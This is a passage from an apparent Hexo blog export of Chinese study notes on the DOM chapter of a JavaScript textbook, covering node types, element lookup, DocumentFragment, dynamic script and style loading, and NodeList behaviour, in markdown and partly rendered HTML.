类型，CDATASection 类型，DocumentType 类型，DocumentFragment 类型，Attr 类型。重点关注下 DocumentFragment 类型，是一种“轻量级”的文档，对于节点在文档与文档片段间的添加，若存在则是移动而不是复制。实践中常作为“仓库”使用，可以避免浏览器反复渲染。\n\n```js\nvar fragment = document.createDocumentFragment();\nvar ul = document.getElementById(\"myList\");\nvar li = null;\nfor (var i = 0; i < 3; i++) {\n  li = document.createElement(\"li\");\n  li.appendChild(document.createTextNode(\"Item \" + (i + 1)));\n  fragment.appendChild(li);\n}\nul.appendChild(fragment);\n```\n\n## DOM 操作技术\n\n### 动态脚本\n\n```js\nfunction loadScript(url) {\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n  script.src = url;\n  document.body.appendChild(script);\n}\n// loadScript(\"client.js\");\n\nfunction loadScriptString(code) {\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n  try {\n    script.appendChild(document.createTextNode(code));\n  } catch (ex) {\n    script.text = code;\n  }\n  document.body.appendChild(script);\n}\n// loadScriptString(\"function sayHi(){alert('hi');}\");\n```\n\n### 动态样式\n\n```js\nfunction loadStyles(url) {\n  var link = document.createElement(\"link\");\n  link.rel = \"stylesheet\";\n  link.type = \"text/css\";\n  link.href = url;\n  var head = document.getElementsByTagName(\"head\")[0];\n  head.appendChild(link);\n}\n// loadStyles(\"styles.css\");\n\nfunction loadStyleString(css) {\n  var style = document.createElement(\"style\");\n  style.type = \"text/css\";\n  try {\n    style.appendChild(document.createTextNode(css));\n  } catch (ex) {\n    style.styleSheet.cssText = css;\n  }\n  var head = document.getElementsByTagName(\"head\")[0];\n  head.appendChild(style);\n}\n// loadStyleString(\"body{background-color:red}\");\n```\n\n### 操作表格\n\n可以用核心 DOM 方法也可以用 HTML DOM 为`<table>`、`<tbody>`和`<tr>`元素添加的属性和方法。由于实践中较少使用，这里不一一列举。\n\n### 使用 NodeList\n\n理解 NodeList 及其“近亲”NamedNodeMap 和 HTMLCollection，是从整体上透彻理解 DOM 的\n关键所在。这三个集合都是“动态的”；换句话说，每当文档结构发生变化时，它们都会得到更新。因\n此，它们始终都会保存着最新、最准确的信息。从本质上说，所有 NodeList 对象都是在访问 DOM 文\n档时实时运行的查询。例如，下列代码会导致无限循环：\n\n```js\nvar divs = document.getElementsByTagName(\"div\"),\n  i,\n  div;\nfor (i = 0; i < divs.length; i++) {\n  div = document.createElement(\"div\");\n  document.body.appendChild(div);\n}\n\n// 解决方法\nvar divs = document.getElementsByTagName(\"div\"),\n  i,\n  len,\n  div;\nfor (i = 0, len = divs.length; i < len; i++) {\n  div = document.createElement(\"div\");\n  document.body.appendChild(div);\n}\n```\n\n实践中，由于 NodeList 的操作开销很大，因此一般都是把 NodeList 取得的值缓存起来。\n\n# 后记\n","source":"_posts/2019/01/2019-01-28-JS高设3版-10.md","raw":"---\ntitle: DOM（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-28 18:59:47\nupdated: 2019-01-28 18:59:47\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\nDOM（文档对象模型）是针对 HTML 和 XML 文档的一个 API（应用程序编程接口）。DOM 描绘了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。\n\n<!-- more -->\n\n# 详述\n\n## 节点层次\n\nHTML 与 DOM 树对应关系示例：\n\n```html\n<html>\n  <head>\n    <title>Sample Page</title>\n  </head>\n  <body>\n    <p>Hello World!</p>\n  </body>\n</html>\n```\n\n![DOM树示例](1.jpg)\n\n文档节点是每个文档的根节点。在这个例子中，文档节点只有一个子节点，即<html>元素，我们称之为**文档元素**。文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中。每个文档只能有一个文档元素。\n\n### Node 类型\n\nDOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现。JavaScript 中通过 Node 类型来实现，作为基类，所有节点类型都继承自 Node 类型。\n\nnodeType 属性：表明节点的类型，由 12 个数值常量来表示。实践中，为了兼容，通常与数值比较，如下：\n\n```js\nif (someNode.nodeType == 1) {\n  //适用于所有浏览器\n  alert(\"Node is an element.\");\n}\n```\n\nnodeName 和 nodeValue 属性：值取决于节点类型，因此实践中通常先检测类型再取值，如下：\n\n```js\nif (someNode.nodeType == 1) {\n  value = someNode.nodeName; //nodeName 的值是元素的标签名\n}\n```\n\nchildNodes 属性：保存着一个 NodeList 对象。NodeList 对象时一种类数组对象，基于 DOM 动态执行查询的结果，DOM 结构的变化能够自动反映在 NodeList 对象中。\n\n其他属性：parentNode，previousSibling，nextSibling，firstChild，lastChild，ownerDocument。\n\nhasChildNodes()方法：无参数，有节点时返回 true。\n\nappendChild()方法：一个参数，要添加的节点，如果该节点已经存在文档中，那么就是移动节点。\n\ninsertBefore()方法：两个参数，要插入的节点和作为参照的节点。\n\nreplaceChild()方法：两个参数，要插入的节点和要替换的节点。\n\nremoveChild()方法：一个参数，要移除的节点。\n\ncloneNode()方法：一个布尔参数，表示是否深复制。\n\nnormalize()方法：处理文本节点，后面章节再详述。\n\n### Document 类型\n\n在浏览器中，document 对象是 HTMLDocument（继承自 Document 类型）的一个实例，表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性，因此可以将其作为全局对象来访问。\n\nDocument 节点具有下列特征：\n\n- nodeType 的值为 9；\n- nodeName 的值为\"#document\"；\n- nodeValue 的值为 null；\n- parentNode 的值为 null；\n- ownerDocument 的值为 null；\n- 其子节点可能是一个 DocumentType（最多一个）、Element（最多一个）、ProcessingInstruction 或 Comment。\n\n#### 文档的子节点\n\n```html\n<html>\n  <body></body>\n</html>\n```\n\n```js\nvar html = document.documentElement; //取得对<html>的引用\nalert(html === document.childNodes[0]); //true\nalert(html === document.firstChild); //true\n\nvar body = document.body; //取得对<body>的引用\n```\n\n#### 文档信息\n\n```js\n//取得文档标题\nvar originalTitle = document.title;\n//设置文档标题\ndocument.title = \"New page title\";\n\n//取得完整的URL\nvar url = document.URL;\n//取得域名\nvar domain = document.domain;\n//取得来源页面的URL\nvar referrer = document.referrer;\n```\n\n其中 domain 可设置，但是不能将这个属性设置为 URL 中不包含的域\n\n```js\n//假设页面来自p2p.wrox.com 域\ndocument.domain = \"wrox.com\"; // 成功\ndocument.domain = \"nczonline.net\"; // 出错！\n```\n\n还有一个限制，不能从松散到紧绷\n\n```js\n//假设页面来自于p2p.wrox.com 域\ndocument.domain = \"wrox.com\"; //松散的（成功）\ndocument.domain = \"p2p.wrox.com\"; //紧绷的（出错！）\n```\n\n实践中可以利用 domain 可设置来解决子域之间跨域问题\n\n#### 查找元素\n\ngetElementById()，。这里的 ID 必须与页面中元素的 id 特性（attribute）严格匹配，包括大小写。\n\ngetElementsByTagName()，返回一个 NodeList，在 HTML 文档中对应的是 HTMLCollection 对象。\n对 HTMLCollection 而言，我们可以向方括号中传入数值或字符串形式的索引值。在后台，对数\n值索引就会调用 item()，而对字符串索引就会调用 namedItem()。\n\n```js\nvar images = document.getElementsByTagName(\"img\");\nalert(images.length); //输出图像的数量\nalert(images[0].src); //输出第一个图像元素的src 特性\nalert(images.item(0).src); //输出第一个图像元素的 src 特性\n\n// <img src=\"myimage.gif\" name=\"myImage\">\nvar myImage = images.namedItem(\"myImage\");\nvar myImage = images[\"myImage\"];\n\nvar allElements = document.getElementsByTagName(\"*\");\n```\n\ngetElementsByName()，只有 HTMLDocument 类型才有的方法。\n\n```html\n<fieldset>\n  <legend>Which color do you prefer?</legend>\n  <ul>\n    <li>\n      <input type=\"radio\" value=\"red\" name=\"color\" id=\"colorRed\" />\n      <label for=\"colorRed\">Red</label>\n    </li>\n    <li>\n      <input type=\"radio\" value=\"green\" name=\"color\" id=\"colorGreen\" />\n      <label for=\"colorGreen\">Green</label>\n    </li>\n    <li>\n      <input type=\"radio\" value=\"blue\" name=\"color\" id=\"colorBlue\" />\n      <label for=\"colorBlue\">Blue</label>\n    </li>\n  </ul>\n</fieldset>\n```\n\n```js\nvar radios = document.getElementsByName(\"color\");\n```\n\n#### 特殊集合\n\n除了属性和方法，document 对象还有一些特殊的集合。这些集合都是 HTMLCollection 对象，\n为访问文档常用的部分提供了快捷方式，包括：\n\n- document.anchors，包含文档中所有带 name 特性的`<a>`元素；\n- document.applets，包含文档中所有的`<applet>`元素，因为不再推荐使用`<applet>`元素，所以这个集合已经不建议使用了；\n- document.forms，包含文档中所有的`<form>`元素，与 document.getElementsByTagName(\"form\")得到的结果相同；\n- document.images，包含文档中所有的`<img>`元素，与 document.getElementsByTagName(\"img\")得到的结果相同；\n- document.links，包含文档中所有带 href 特性的`<a>`元素。\n\n#### 其他\n\n```js\ndocument.implementation.hasFeature();\ndocument.write();\ndocument.writeln();\ndocument.open();\ndocument.close();\n```\n\n### Element 类型\n\nElement 类型用于表现 XML 或 HTML 元素，提供了对元素标签名、子节点及特性的访问。Element 节点具有以下特征：\n\n- nodeType 的值为 1；\n- nodeName 的值为元素的标签名；\n- nodeValue 的值为 null；\n- parentNode 可能是 Document 或 Element；\n- 其子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference。\n  要访问元素的标签名，可以使用 nodeName 属性，也可以使用 tagName 属性。\n\n对于标签名，HTML 中始终返回全大写，XML 中返回与源代码中一致，因此，实践中通常直接用 toLowerCase()转换后比较。如下：\n\n```js\n// <div id=\"myDiv\"></div>\nvar div = document.getElementById(\"myDiv\");\nalert(div.tagName); //\"DIV\"\nalert(div.tagName == div.nodeName); //true\n\nif (element.tagName == \"div\") {\n  //不能这样比较，很容易出错！\n  //在此执行某些操作\n}\nif (element.tagName.toLowerCase() == \"div\") {\n  //这样最好（适用于任何文档）\n  //在此执行某些操作\n}\n```\n\n#### HTML 元素\n\n对应的对象共有的读写属性有：`id,title,className,lang,dir`\n\n#### 操作特性\n\ngetAttribute()、setAttribute()、removeAttribute()、setAttribute()\n\n特性名称不区分大小写，自定义特性加 data-前缀。\n\n实践中，操作特性，常用对象的属性（div.id），只有自定义特性才用 getAttribute()、setAttribute()。\n\n#### attributes 属性\n\n一般只在遍历元素的属性时使用，例如：\n\n```js\nfunction outputAttributes(element) {\n  var pairs = new Array(),\n    attrName,\n    attrValue,\n    i,\n    len;\n  for (i = 0, len = element.attributes.length; i < len; i++) {\n    attrName = element.attributes[i].nodeName;\n    attrValue = element.attributes[i].nodeValue;\n    pairs.push(attrName + '=\"' + attrValue + '\"');\n  }\n  return pairs.join(\" \");\n}\n```\n\n#### 创建元素\n\ndocument.createElement()，一个参数，要创建元素的标签名。\n\n```js\nvar div = document.createElement(\"div\");\n```\n\n#### 元素的子节点\n\n大部分浏览器中，空格、换行都会作为元素的子节点，因此实践中会先检查 nodeType 属性，如下：\n\n```js\nfor (var i = 0, len = element.childNodes.length; i < len; i++) {\n  if (element.childNodes[i].nodeType == 1) {\n    //执行某些操作\n  }\n}\n```\n\n### Text 类型\n\n文本节点由 Text 类型表示，包含的是可以照字面解释的纯文本内容。纯文本中可以包含转义后的 HTML 字符，但不能包含 HTML 代码。Text 节点具有以下特征：\n\n- nodeType 的值为 3；\n- nodeName 的值为\"#text\"；\n- nodeValue 的值为节点所包含的文本；\n- parentNode 是一个 Element；\n- 不支持（没有）子节点。\n\n可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。对 nodeValue 的修改也会通过 data 反映出来，反之亦然。使用下列方法可以操作节点中的文本。\n\n- appendData(text)：将 text 添加到节点的末尾。\n- deleteData(offset, count)：从 offset 指定的位置开始删除 count 个字符。\n- insertData(offset, text)：在 offset 指定的位置插入 text。\n- replaceData(offset, count, text)：用 text 替换从 offset 指定的位置开始到 offset+count 为止处的文本。\n- splitText(offset)：从 offset 指定的位置将当前文本节点分成两个文本节点。\n- substringData(offset, count)：提取从 offset 指定的位置开始到 offset+count 为止处的字符串。\n\nlength 属性，保存着节点中字符的数目。\n\n#### 创建文本节点\n\ndocument.createTextNode()，一个参数，要插入节点中的文本。\n\n#### 规范化文本节点\n\nnormalize()，在父元素上调用该方法，会把所有文本节点合并成一个节点。\n\n#### 分割文本节点\n\nsplitText()，一个参数，指定位置分割文本节点。原来的文本节点将包含从开始到指定位置之前的内容，新文本节点将包含剩下的文本。\n\n### 其他类型\n\n了解 Comment 类型，CDATASection 类型，DocumentType 类型，DocumentFragment 类型，Attr 类型。重点关注下 DocumentFragment 类型，是一种“轻量级”的文档，对于节点在文档与文档片段间的添加，若存在则是移动而不是复制。实践中常作为“仓库”使用，可以避免浏览器反复渲染。\n\n```js\nvar fragment = document.createDocumentFragment();\nvar ul = document.getElementById(\"myList\");\nvar li = null;\nfor (var i = 0; i < 3; i++) {\n  li = document.createElement(\"li\");\n  li.appendChild(document.createTextNode(\"Item \" + (i + 1)));\n  fragment.appendChild(li);\n}\nul.appendChild(fragment);\n```\n\n## DOM 操作技术\n\n### 动态脚本\n\n```js\nfunction loadScript(url) {\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n  script.src = url;\n  document.body.appendChild(script);\n}\n// loadScript(\"client.js\");\n\nfunction loadScriptString(code) {\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n  try {\n    script.appendChild(document.createTextNode(code));\n  } catch (ex) {\n    script.text = code;\n  }\n  document.body.appendChild(script);\n}\n// loadScriptString(\"function sayHi(){alert('hi');}\");\n```\n\n### 动态样式\n\n```js\nfunction loadStyles(url) {\n  var link = document.createElement(\"link\");\n  link.rel = \"stylesheet\";\n  link.type = \"text/css\";\n  link.href = url;\n  var head = document.getElementsByTagName(\"head\")[0];\n  head.appendChild(link);\n}\n// loadStyles(\"styles.css\");\n\nfunction loadStyleString(css) {\n  var style = document.createElement(\"style\");\n  style.type = \"text/css\";\n  try {\n    style.appendChild(document.createTextNode(css));\n  } catch (ex) {\n    style.styleSheet.cssText = css;\n  }\n  var head = document.getElementsByTagName(\"head\")[0];\n  head.appendChild(style);\n}\n// loadStyleString(\"body{background-color:red}\");\n```\n\n### 操作表格\n\n可以用核心 DOM 方法也可以用 HTML DOM 为`<table>`、`<tbody>`和`<tr>`元素添加的属性和方法。由于实践中较少使用，这里不一一列举。\n\n### 使用 NodeList\n\n理解 NodeList 及其“近亲”NamedNodeMap 和 HTMLCollection，是从整体上透彻理解 DOM 的\n关键所在。这三个集合都是“动态的”；换句话说，每当文档结构发生变化时，它们都会得到更新。因\n此，它们始终都会保存着最新、最准确的信息。从本质上说，所有 NodeList 对象都是在访问 DOM 文\n档时实时运行的查询。例如，下列代码会导致无限循环：\n\n```js\nvar divs = document.getElementsByTagName(\"div\"),\n  i,\n  div;\nfor (i = 0; i < divs.length; i++) {\n  div = document.createElement(\"div\");\n  document.body.appendChild(div);\n}\n\n// 解决方法\nvar divs = document.getElementsByTagName(\"div\"),\n  i,\n  len,\n  div;\nfor (i = 0, len = divs.length; i < len; i++) {\n  div = document.createElement(\"div\");\n  document.body.appendChild(div);\n}\n```\n\n实践中，由于 NodeList 的操作开销很大，因此一般都是把 NodeList 取得的值缓存起来。\n\n# 后记\n","slug":"2019-01-28-JS高设3版-10","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91400akwovv2tbqybto","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>DOM（文档对象模型）是针对 HTML 和 XML 文档的一个 API（应用程序编程接口）。DOM 描绘了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"节点层次\"><a href=\"#节点层次\" class=\"headerlink\" title=\"节点层次\"></a>节点层次</h2><p>HTML 与 DOM 树对应关系示例：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Sample Page<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Hello World!<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019-01-28-JS高设3版-10/1.jpg\" alt=\"DOM树示例\"></p>\n<p>文档节点是每个文档的根节点。在这个例子中，文档节点只有一个子节点，即<html>元素，我们称之为<strong>文档元素</strong>。文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中。每个文档只能有一个文档元素。</html></p>\n<h3 id=\"Node-类型\"><a href=\"#Node-类型\" class=\"headerlink\" title=\"Node 类型\"></a>Node 类型</h3><p>DOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现。JavaScript 中通过 Node 类型来实现，作为基类，所有节点类型都继承自 Node 类型。</p>\n<p>nodeType 属性：表明节点的类型，由 12 个数值常量来表示。实践中，为了兼容，通常与数值比较，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (someNode.nodeType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//适用于所有浏览器</span></span><br><span class=\"line\">  alert(<span class=\"string\">\"Node is an element.\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>nodeName 和 nodeValue 属性：值取决于节点类型，因此实践中通常先检测类型再取值，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (someNode.nodeType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  value = someNode.nodeName; <span class=\"comment\">//nodeName 的值是元素的标签名</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>childNodes 属性：保存着一个 NodeList 对象。NodeList 对象时一种类数组对象，基于 DOM 动态执行查询的结果，DOM 结构的变化能够自动反映在 NodeList 对象中。</p>\n<p>其他属性：parentNode，previousSibling，nextSibling，firstChild，lastChild，ownerDocument。</p>\n<p>hasChildNodes()方法：无参数，有节点时返回 true。</p>\n<p>appendChild()方法：一个参数，要添加的节点，如果该节点已经存在文档中，那么就是移动节点。</p>\n<p>insertBefore()方法：两个参数，要插入的节点和作为参照的节点。</p>\n<p>replaceChild()方法：两个参数，要插入的节点和要替换的节点。</p>\n<p>removeChild()方法：一个参数，要移除的节点。</p>\n<p>cloneNode()方法：一个布尔参数，表示是否深复制。</p>\n<p>normalize()方法：处理文本节点，后面章节再详述。</p>\n<h3 id=\"Document-类型\"><a href=\"#Document-类型\" class=\"headerlink\" title=\"Document 类型\"></a>Document 类型</h3><p>在浏览器中，document 对象是 HTMLDocument（继承自 Document 类型）的一个实例，表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性，因此可以将其作为全局对象来访问。</p>\n<p>Document 节点具有下列特征：</p>\n<ul>\n<li>nodeType 的值为 9；</li>\n<li>nodeName 的值为”#document”；</li>\n<li>nodeValue 的值为 null；</li>\n<li>parentNode 的值为 null；</li>\n<li>ownerDocument 的值为 null；</li>\n<li>其子节点可能是一个 DocumentType（最多一个）、Element（最多一个）、ProcessingInstruction 或 Comment。</li>\n</ul>\n<h4 id=\"文档的子节点\"><a href=\"#文档的子节点\" class=\"headerlink\" title=\"文档的子节点\"></a>文档的子节点</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> html = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">//取得对&lt;html&gt;的引用</span></span><br><span class=\"line\">alert(html === <span class=\"built_in\">document</span>.childNodes[<span class=\"number\">0</span>]); <span class=\"comment\">//true</span></span><br><span class=\"line\">alert(html === <span class=\"built_in\">document</span>.firstChild); <span class=\"comment\">//true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> body = <span class=\"built_in\">document</span>.body; <span class=\"comment\">//取得对&lt;body&gt;的引用</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"文档信息\"><a href=\"#文档信息\" class=\"headerlink\" title=\"文档信息\"></a>文档信息</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//取得文档标题</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> originalTitle = <span class=\"built_in\">document</span>.title;</span><br><span class=\"line\"><span class=\"comment\">//设置文档标题</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.title = <span class=\"string\">\"New page title\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//取得完整的URL</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.URL;</span><br><span class=\"line\"><span class=\"comment\">//取得域名</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> domain = <span class=\"built_in\">document</span>.domain;</span><br><span class=\"line\"><span class=\"comment\">//取得来源页面的URL</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> referrer = <span class=\"built_in\">document</span>.referrer;</span><br></pre></td></tr></table></figure>\n<p>其中 domain 可设置，但是不能将这个属性设置为 URL 中不包含的域</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//假设页面来自p2p.wrox.com 域</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"wrox.com\"</span>; <span class=\"comment\">// 成功</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"nczonline.net\"</span>; <span class=\"comment\">// 出错！</span></span><br></pre></td></tr></table></figure>\n<p>还有一个限制，不能从松散到紧绷</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//假设页面来自于p2p.wrox.com 域</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"wrox.com\"</span>; <span class=\"comment\">//松散的（成功）</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"p2p.wrox.com\"</span>; <span class=\"comment\">//紧绷的（出错！）</span></span><br></pre></td></tr></table></figure>\n<p>实践中可以利用 domain 可设置来解决子域之间跨域问题</p>\n<h4 id=\"查找元素\"><a href=\"#查找元素\" class=\"headerlink\" title=\"查找元素\"></a>查找元素</h4><p>getElementById()，。这里的 ID 必须与页面中元素的 id 特性（attribute）严格匹配，包括大小写。</p>\n<p>getElementsByTagName()，返回一个 NodeList，在 HTML 文档中对应的是 HTMLCollection 对象。<br>对 HTMLCollection 而言，我们可以向方括号中传入数值或字符串形式的索引值。在后台，对数<br>值索引就会调用 item()，而对字符串索引就会调用 namedItem()。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> images = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"img\"</span>);</span><br><span class=\"line\">alert(images.length); <span class=\"comment\">//输出图像的数量</span></span><br><span class=\"line\">alert(images[<span class=\"number\">0</span>].src); <span class=\"comment\">//输出第一个图像元素的src 特性</span></span><br><span class=\"line\">alert(images.item(<span class=\"number\">0</span>).src); <span class=\"comment\">//输出第一个图像元素的 src 特性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// &lt;img src=\"myimage.gif\" name=\"myImage\"&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> myImage = images.namedItem(<span class=\"string\">\"myImage\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> myImage = images[<span class=\"string\">\"myImage\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> allElements = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"*\"</span>);</span><br></pre></td></tr></table></figure>\n<p>getElementsByName()，只有 HTMLDocument 类型才有的方法。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">fieldset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">legend</span>&gt;</span>Which color do you prefer?<span class=\"tag\">&lt;/<span class=\"name\">legend</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"radio\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"red\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"color\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"colorRed\"</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"colorRed\"</span>&gt;</span>Red<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"radio\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"green\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"color\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"colorGreen\"</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"colorGreen\"</span>&gt;</span>Green<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"radio\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"blue\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"color\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"colorBlue\"</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span 